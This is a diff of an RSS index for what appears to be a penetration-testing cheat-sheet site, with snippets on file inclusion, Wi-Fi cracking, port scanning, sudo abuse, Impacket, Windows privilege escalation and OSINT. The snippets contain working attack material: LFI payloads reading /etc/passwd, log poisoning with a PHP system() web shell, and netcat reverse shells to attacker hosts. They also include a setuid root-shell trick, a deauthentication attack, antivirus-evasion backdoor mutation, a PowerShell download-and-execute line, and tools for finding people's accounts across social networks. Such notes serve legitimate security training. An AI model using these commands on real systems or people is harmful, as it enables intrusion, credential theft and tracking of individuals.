@@ -136,7 +136,7 @@ Enumeration - Host Information # Exact OS version type C:/Windows/system32/eula.
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/web-attacks/files-inclusions-and-injections/lfi_rfi/</guid>
-      <description>Local File Inclusion # Double Encoding page=php://filter/read=convert.base64-encode/resource=conf page%3Dphp%20%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dconf page%253Dphp%2520%253A%252F%252Ffilter%252Fread%253Dconvert.base64-encode%252Fresource%253Dconf # Files file:///boot.ini file:///boot.ini%00 file:///boot.ini%2500 file:///etc/passwd file:///etc/passwd%00 file:///etc/passwd%2500 # LFI in HTTP headers curl --header &amp;#34;Accept-Language: php://filter/read=convert.base64-encode/resource=config.php&amp;#34; http://target # LFI to RCE Can you read for a .log file such as: C:\xampp\apache\logs\access.log ? Then go nc -nv IP 80 Then write: &amp;lt;?php system($_GET[&amp;#39;acknak&amp;#39;]);?&amp;gt; Now access the log file using the LFI and inject system command in acknak parameter !</description>
+      <description>Local File Inclusion # Double Encoding page=php://filter/read=convert.base64-encode/resource=conf page%3Dphp%20%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dconf page%253Dphp%2520%253A%252F%252Ffilter%252Fread%253Dconvert.base64-encode%252Fresource%253Dconf # Files file:///boot.ini file:///boot.ini%00 file:///boot.ini%2500 file:///etc/passwd file:///etc/passwd%00 file:///etc/passwd%2500 # LFI in HTTP headers curl --header &amp;#34;Accept-Language: php://filter/read=convert.base64-encode/resource=config.php&amp;#34; http://target # LFI to RCE Can you read for a .log file such as: C:\xampp\apache\logs\access.log ? Then go nc -nv IP 80 Then write: &amp;lt;?php system($_GET[&amp;#39;acknak&amp;#39;]);?&amp;gt; Now access the log file using the LFI and inject system command in acknak parameter !# Checking if proc/self/environ is accessible # If blank page --&amp;gt; NOPE view.</description>
     </item>
     
     <item>
@@ -254,6 +254,15 @@ General &amp;amp; Tricks # Look for strange process ps aux # Look for setuid pro
       <guid>/recon-enumeration/application-scans/web_application_scan/</guid>
       <description>Nikto # For web applications, you can use nikto to identify potential vulnerabilities # Not very stealth # Think about changing the default user agent ! nitko -h http://monsite.com -o output.xml -Format [csv, xml, html, txt] 
 Whatweb # Whatweb is another scanning tool for web applications $ whatweb -h $ whatweb -l # Liste les plugins $ whatweb www.monsite.com $ whatweb www.monsite.com -v $ whatweb www.monsite.com -a 1 # Stealhty $ whatweb www.</description>
+    </item>
+    
+    <item>
+      <title>WiFi Cracking</title>
+      <link>/wireless/wifi_cracking/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/wireless/wifi_cracking/</guid>
+      <description>Aircrack-NG Suite # Turning on the monitor mode # We can not see packages from SSIDs that we are not associated with airmon-ng start wlan0** # Monitoring # We capture packages running: airodump-ng mon0** # Speeding up # We can launch a de-authentication attack to speed up the process: aireplay-ng -0 3 -a &amp;lt;macaddress of the ap&amp;gt; mon0** # Capturing packages airodump-ng mon0 --bssid –c (channel) –w (file name to save)** # Cracking the cap aircrack-ng RHAWEP-0.</description>
     </item>
     
     <item>
@@ -432,7 +441,7 @@ Mimikatz # If you have an LSASS dump, you can use the minidump module mimikatz #
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/recon-enumeration/port-scanning/nmap_cheatsheet/</guid>
-      <description>Full commands examples # Ping scan nmap -sP 192.168.0.0/24 # Quick scan nmap -T4 -F 192.168.1.1 -vvv # Quick scan plus (more info but more aggressive) nmap -sV -T4 -O -F –version-light 192.168.1.1 -vvv # TCP Syn and UDP Scan (requires root) nmap -sS -sU -PN -p T:80,T:445,U:161 192.168.1.1 # Soft nmap nmap -v -Pn -n -T4 -sT -sV --version-intensity=5 --reason 192.168.1.1 # Full nmap nmap -v -Pn -n -T4 -sT -p- --reason 192.</description>
+      <description>https://github.com/Tib3rius/AutoRecon Full commands examples # Ping scan nmap -sP 192.168.0.0/24 # Quick scan nmap -T4 -F 192.168.1.1 -vvv # Quick scan plus (more info but more aggressive) nmap -sV -T4 -O -F –version-light 192.168.1.1 -vvv # TCP Syn and UDP Scan (requires root) nmap -sS -sU -PN -p T:80,T:445,U:161 192.168.1.1 # Soft nmap nmap -v -Pn -n -T4 -sT -sV --version-intensity=5 --reason 192.168.1.1 # Full nmap nmap -v -Pn -n -T4 -sT -p- --reason 192.</description>
     </item>
     
     <item>
@@ -538,7 +547,7 @@ Enumeration # using smtp-user-enum script smtp-user-enum -M VRFY -U users.txt -t
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/linux-systems/privilege-escalation/abusing_sudo_programs/</guid>
-      <description>Resources https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/ 
+      <description>Resources https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/ https://gtfobins.github.io/ 
 General Information # Get privileges for users sudo -l /bin/dash is the only shell to keep the sticky bit, so if you run as root (included cron, or services running as root): install -mode 4755 /bin/dash /tmp/sh Then you will have a /tmp/sh that gives any user who calls it root ! # Some payloads to overcome limited shells ssh user@$ip nc $localip 4444 -e /bin/sh python -c &amp;#39;import pty; pty.</description>
     </item>
     
@@ -732,7 +741,8 @@ ICMP Exfiltration 2 #!/usr/bin/env python from scapy.</description>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/windows-systems/exploitation/impacket/</guid>
-      <description>TODO</description>
+      <description>Table of Content  General Remote Execution Kerberos Windows Secrets Server Tools / MiTM Attacks WMI Known vulnerabilities SMB/MSRPC MSSQL/TDS File Formats Others  
+General # Almost every Impacket scripts follows the same option syntax authentication: -hashes LMHASH:NTHASH NTLM hashes, format is LMHASH:NTHASH -no-pass don&#39;t ask for password (useful for -k) -k Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line -aesKey hex key AES key to use for Kerberos Authentication (128 or 256 bits) connection: -dc-ip ip address IP Address of the domain controller.</description>
     </item>
     
     <item>
@@ -799,7 +809,7 @@ Basics / Classical Reverse shell: nc -nv IP 443 -e /bin/bash ncat --udp IP 443 -
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/windows-systems/privilege-escalation/tricks/</guid>
-      <description>Global Tricks https://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/ https://guif.re/windowseop https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html # You can feed syteminfo output to windows-exploit-suggester ./windows-exploit-suggester.py --update ./windows-exploit-suggester.py --database 2019-02-19-mssb.xls --systeminfo /home/m***REMOVED***/Documents/Galactic/systeminfo.txt # Getting shell in limited interpreter system(&amp;#34;start cmd.exe /k $cmd&amp;#34;) # Reverse shell nc.exe attacker_ip attacker_port -e cmd.exe # From admin to SYSTEM psexec.exe -i -s %SystemRoot%\system32\cmd.exe # AV Bypass # You can generate mutated binary hyperion.exe ../backdoor.exe ../backdoor_mutation.exe # Download and exec powershell on target powershell.exe &amp;#34;IEX (New-Object Net.</description>
+      <description>Global Tricks https://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/ https://guif.re/windowseop https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html https://lolbas-project.github.io/# # You can feed syteminfo output to windows-exploit-suggester ./windows-exploit-suggester.py --update ./windows-exploit-suggester.py --database 2019-02-19-mssb.xls --systeminfo /home/m***REMOVED***/Documents/Galactic/systeminfo.txt # Getting shell in limited interpreter system(&amp;#34;start cmd.exe /k $cmd&amp;#34;) # Reverse shell nc.exe attacker_ip attacker_port -e cmd.exe # From admin to SYSTEM psexec.exe -i -s %SystemRoot%\system32\cmd.exe # AV Bypass # You can generate mutated binary hyperion.exe ../backdoor.exe ../backdoor_mutation.exe # Download and exec powershell on target powershell.exe &amp;#34;IEX (New-Object Net.</description>
     </item>
     
     <item>
@@ -968,16 +978,6 @@ Usage python danger-zone.py -h usage: dangerzone.py [-h] [--email EMAIL] [--addr
     </item>
     
     <item>
-      <title>General - MISC - Multi</title>
-      <link>/open-source-intelligence-osint/human-recon/social-networks/general_misc/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/human-recon/social-networks/general_misc/</guid>
-      <description>Tips &amp;amp; Tricks # Liveleak allows to see what will be removed on others video website.. # Take care https://www.liveleak.com/ # Webcams (legit and bad configuration) http://www.insecam.org/ https://www.earthcam.com # Download Periscope videos https://downloadperiscopevideos.com/index.php 
-UserRecon https://github.com/thelinuxchoice/userrecon # Find usernames across over 75 social networks. # This is useful if you are running an investigation to determine the usage of # the same username on different social networks. ./userrecon.sh &amp;lt;username&amp;gt;</description>
-    </item>
-    
-    <item>
       <title>Geolocation</title>
       <link>/open-source-intelligence-osint/human-recon/geolocation/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -1025,6 +1025,15 @@ cmd.exe # Enable RDP from cmd.exe reg add &amp;#34;HKEY_LOCAL_MACHINE\SYSTEM\Cur
     </item>
     
     <item>
+      <title>Usernames and Emails</title>
+      <link>/open-source-intelligence-osint/human-recon/social-networks/usernames_mails/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/human-recon/social-networks/usernames_mails/</guid>
+      <description>Socialscan (https://github.com/iojw/socialscan) # Many tools used to check if an account exists comes with false positive # 100% accuracy: Rather than scanning profile pages, socialscan queries the # registration servers of the platforms directly, retrieving the appropriate # CSRF tokens, headers, and cookies. # This eliminates all false positives/negatives, ensuring that results are accurate. # Speed: socialscan uses asyncio along with aiohttp to conduct all # queries concurrently, resulting in very quick searching even with bulk queries.</description>
+    </item>
+    
+    <item>
       <title>Windows Shells Methods</title>
       <link>/shells-methods/windows/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -1052,6 +1061,17 @@ Identification and manual test # Using netcat nc -nv IP 119 LIST GROUP group_nam
       <description>/etc/init.d/pure-ftpd 
 SMB Server setup # Set up a SMB server using smbserver.py from impacket smbserver.py SHARE_NAME path/to/share # From target Windows: net view \\KALI_IP (Should display the SHARE_NAME) dir \\KALI_IP\SHARE_NAME copy \\KALI_IP\SHARE_NAME\file.exe . # Looking at smbserver logs you also grab the NTLMv2 hashes of your current Windows user # can be usefull to PTH, or crack passwords 
 Build a FTP and transfer file # Set up a ftp downloading script on the target machine: echo open IP 21 &amp;gt; ftp.</description>
+    </item>
+    
+    <item>
+      <title>General - MISC - Multi</title>
+      <link>/open-source-intelligence-osint/human-recon/social-networks/general_misc/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/open-source-intelligence-osint/human-recon/social-networks/general_misc/</guid>
+      <description>Tips &amp;amp; Tricks # Liveleak allows to see what will be removed on others video website.. # Take care https://www.liveleak.com/ # Webcams (legit and bad configuration) http://www.insecam.org/ https://www.earthcam.com # Download Periscope videos https://downloadperiscopevideos.com/index.php 
+SocialBlade # Socialblade is an online tool where you can see and analyze Youtube, Instagram, Twitch, Twitter or Dailymotion accounts https://socialblade.com/twitter/user/***REMOVED*** 
+Youtube # Yasiv is an online tool allowing to map links and relations between Youtube videos https://yasiv.</description>
     </item>
     
     <item>
@@ -1093,6 +1113,15 @@ Modules &amp;amp; Tools • Censys: uses censys.io to collect a large amount of 
     </item>
     
     <item>
+      <title>BurpSuite</title>
+      <link>/web-attacks/burpsuite/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-attacks/burpsuite/</guid>
+      <description>TODO</description>
+    </item>
+    
+    <item>
       <title>MISC</title>
       <link>/open-source-intelligence-osint/technical-recon/misc/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -1128,6 +1157,16 @@ Identification # Port 139 # Using nbtscan to identify host/domain nbtscan IP (id
       
       <guid>/open-source-intelligence-osint/technical-recon/frameworks-correlation/belati/</guid>
       <description>General Informations # Belati is tool for Collecting Public Data &amp;amp; Public Document from Website and other service for OSINT purpose. # This tools is inspired by Foca and Datasploit for OSINT # Might need root privileges to executes all tools # Like nmap. But it works well without root (nmap won&amp;#39;t be executed) # Not totally passive as long as it does an HTTP Banner Grabbing for earch domain/subdomain found.</description>
+    </item>
+    
+    <item>
+      <title>Postman</title>
+      <link>/web-attacks/postman/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/web-attacks/postman/</guid>
+      <description>https://www.guru99.com/postman-tutorial.html https://openclassrooms.com/fr/courses/4668056-construisez-des-microservices/5123020-testez-votre-api-grace-a-postman https://www.toolsqa.com/postman-tutorial/ https://amethyste16.wordpress.com/2016/02/24/tutoriel-postman/ 
+User Interface Header # Import --&amp;gt; Used to import collection or environment. # Runner --&amp;gt; Automation tests can be executed through the Collection Runner. # Workspace --&amp;gt; You can divide work using workspaces Sidebar # History --&amp;gt; Past requests that you have sent will be displayed in History. # This makes it easy to track actions that you have done. # Organize --&amp;gt; your test suite by creating collections.</description>
     </item>
     
     <item>
